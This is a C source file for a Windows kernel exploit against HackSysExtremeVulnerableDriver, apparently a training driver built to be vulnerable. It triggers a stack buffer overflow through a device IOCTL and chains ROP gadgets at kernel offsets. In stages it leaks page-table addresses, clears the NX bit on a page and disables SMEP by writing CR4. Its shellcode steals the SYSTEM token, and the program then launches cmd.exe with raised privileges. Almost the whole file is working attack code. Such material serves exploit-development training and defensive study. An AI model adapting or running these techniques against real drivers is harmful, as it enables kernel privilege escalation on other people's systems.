#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>
#include <stdio.h>

#define IOCTL(Function) \
  CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800)

#define PTE_SHIFT 0x9
#define PTE_MASK 0x7FFFFFFFF8
#define PTE_NX_BIT 0x8000000000000000
#define DISABLE_SMEP 0x270678

#define PAYLOAD_LEN 0x848
#define OFFSET_TO_RET (0x818 / 0x8)

char shellcode[] =
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"  // mov rdx, [gs:188h]
"\x4C\x8B\x82\x20\x02\x00\x00"          // mov r8, [rdx + 220h]
"\x4D\x8B\x88\x48\x04\x00\x00"          // mov r9, [r8 + 448h]
"\x49\x8B\x09"                          // mov rcx, [r9]

// find_system_proc:
"\x48\x8B\x51\xF8"  // mov rdx, [rcx - 8]
"\x48\x83\xFA\x04"  // cmp rdx, 4
"\x74\x05"          // jz found_system
"\x48\x8B\x09"      // mov rcx, [rcx]
"\xEB\xF1"          // jmp find_system_proc

// found_system:
"\x48\x8B\x41\x70"              // mov rax, [rcx + 70h]
"\x24\xF0"                      // and al, 0f0h
"\x49\x89\x80\xB8\x04\x00\x00"  // mov [r8 + 4b8h]

// recover:
"\x48\x83\xc4\x10"  // add rsp, 10h
"\x48\x31\xF6"      // xor rsi, rsi
"\x48\x31\xFF"      // xor rdi, rdi
"\x48\x31\xC0"      // xor rax, rax
"\xc3"              // ret
;

uint64_t KernelBase() {
    uint64_t drivers[1000];
    uint32_t cb_needed;

    EnumDeviceDrivers((LPVOID*)drivers, 1000, (LPDWORD)&cb_needed);
    uint64_t kernel_base = drivers[0];

    return kernel_base;
}

int main() {
    HANDLE handle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Could not open HEVD handle\n");
        exit(-1);
    }

    uint64_t kernel_base = KernelBase();
    uint64_t pop_rcx = kernel_base + 0x21f08c;
    uint64_t pop_rax = kernel_base + 0x2017f2;
    uint64_t mov_rax = kernel_base + 0x351d24;    // mov rax,qword ptr [rax+38h]
    uint64_t mov_qword = kernel_base + 0x297b68;  // mov qword ptr [rcx+18h],rax
    uint64_t get_pte_base = kernel_base + 0x29cc43;
    uint64_t ret = kernel_base + 0x3d9e81;
    uint64_t mov_cr4 = kernel_base + 0x9b3613;
    printf("[+] kernel base @ 0x%p\n", kernel_base);
    printf("[+] pop rcx ; ret @ 0x%p\n", pop_rcx);
    printf("[+] pop rax ; ret @ 0x%p\n", pop_rax);
    printf("[+] mov rax, qword ptr [rax+38h] ; ret @ 0x%p\n", mov_rax);
    printf("[+] mov qword ptr [rcx+18h], rax ; ret @ 0x%p\n", mov_qword);
    printf("[+] ret @ 0x%p\n", ret);
    printf("[+] mov cr4, ecx ; ret @ 0x%p\n", mov_cr4);

    uint64_t* payload = (uint64_t*)VirtualAlloc(
        NULL, 0x850, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload) {
        fprintf(stderr, "\n[!] Failed to allocate memory\n");
        exit(-1);
    }
    SecureZeroMemory((PVOID)payload, 0x850);

    // Stage 1: Leak PTE Address of LPE shellcode
    uint64_t primitive;
    payload[OFFSET_TO_RET + 0] = pop_rax;
    payload[OFFSET_TO_RET + 1] = get_pte_base - 0x38;
    payload[OFFSET_TO_RET + 2] = pop_rcx;
    payload[OFFSET_TO_RET + 3] = (uint64_t)&primitive - 0x18;
    payload[OFFSET_TO_RET + 4] = mov_rax;
    payload[OFFSET_TO_RET + 5] = mov_qword;
    if (!DeviceIoControl(handle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        (LPVOID)payload, PAYLOAD_LEN, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "\n[!] Error sending IOCTL to driver\n");
        exit(-1);
    }

    // Stage 2-1: Get PTE value
    uint64_t eop_shellcode =
        (uint64_t)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    if (!eop_shellcode) {
        fprintf(stderr, "\n[!] Failed to allocate shellcode memory\n");
        exit(-1);
    }
    memcpy((void*)eop_shellcode, (void*)shellcode, sizeof(shellcode));

    uint64_t pte_of_shellcode = eop_shellcode;
    uint64_t pte_base = primitive;
    for (int i = 0; i < 4; ++i) {
        pte_of_shellcode >>= PTE_SHIFT;
        pte_of_shellcode &= PTE_MASK;
        pte_of_shellcode += pte_base;
    }

    printf("[+] page table entry base @ 0x%p\n", pte_base);
    printf("[+] page table entry of shellcode @ 0x%p\n", pte_of_shellcode);
    payload[OFFSET_TO_RET + 0] = pop_rax;
    payload[OFFSET_TO_RET + 1] = pte_of_shellcode - 0x38;
    payload[OFFSET_TO_RET + 2] = pop_rcx;
    payload[OFFSET_TO_RET + 3] = (uint64_t)&primitive - 0x18;
    payload[OFFSET_TO_RET + 4] = mov_rax;
    payload[OFFSET_TO_RET + 5] = mov_qword;
    if (!DeviceIoControl(handle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        (LPVOID)payload, PAYLOAD_LEN, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "\n[!] Error sending IOCTL to driver\n");
        exit(-1);
    }

    // Stage 2-2: Overwrite NX bit
    printf("[+] page table entry value: 0x%p\n", primitive);
    printf("[+] overwrite page table entry value with 0x%p\n",
        primitive & ~PTE_NX_BIT);
    payload[OFFSET_TO_RET + 0] = pop_rax;
    payload[OFFSET_TO_RET + 1] = primitive & ~PTE_NX_BIT;
    payload[OFFSET_TO_RET + 2] = pop_rcx;
    payload[OFFSET_TO_RET + 3] = pte_of_shellcode - 0x18;
    payload[OFFSET_TO_RET + 4] = mov_qword;
    payload[OFFSET_TO_RET + 5] = ret;
    if (!DeviceIoControl(handle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        (LPVOID)payload, PAYLOAD_LEN, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "\n[!] Error sending IOCTL to driver\n");
        exit(-1);
    }

    // Stage 3: Disable Hardware SMEP and Jump to Shellcode
    payload[OFFSET_TO_RET + 0] = pop_rcx;
    payload[OFFSET_TO_RET + 1] = DISABLE_SMEP;
    payload[OFFSET_TO_RET + 2] = mov_cr4;
    payload[OFFSET_TO_RET + 3] = eop_shellcode;
    if (!DeviceIoControl(handle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        (LPVOID)payload, PAYLOAD_LEN, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "\n[!] Error sending IOCTL to driver\n");
        exit(-1);
    }

    // Stage 4: Spawn shell with Privilege
    STARTUPINFOA si;
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi;
    SecureZeroMemory(&pi, sizeof(pi));

    CreateProcessA("C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    CloseHandle(handle);
    return 0;
}